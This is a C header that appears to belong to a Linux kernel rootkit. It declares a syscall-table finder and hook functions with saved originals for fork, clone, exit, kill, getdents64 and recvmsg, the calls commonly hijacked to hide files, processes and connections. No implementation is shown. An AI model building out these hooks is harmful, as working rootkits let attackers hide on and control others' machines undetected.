#ifndef __SYSCALLS_H
#define __SYSCALLS_H

#include "common.h"
#include "hidefs.h"

unsigned long *find_syscall_table(void);

typedef asmlinkage long (*sys_call_stub)(const struct pt_regs *);

// asmlinkage long rk_access(const struct pt_regs *);
asmlinkage long rk_clone(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
asmlinkage long rk_fork(const struct pt_regs *);
asmlinkage long rk_vfork(const struct pt_regs *);
asmlinkage long rk_exit(const struct pt_regs *);
asmlinkage long rk_exit_group(const struct pt_regs *);
asmlinkage long rk_kill(const struct pt_regs *);
asmlinkage long rk_getdents64(const struct pt_regs *);
asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs);

// extern sys_call_stub orig_access;
extern asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
extern sys_call_stub orig_fork;
extern sys_call_stub orig_vfork;
extern sys_call_stub orig_exit;
extern sys_call_stub orig_exit_group;
extern sys_call_stub orig_kill;
extern sys_call_stub orig_getdents64;
extern sys_call_stub orig_recvmsg;

#endif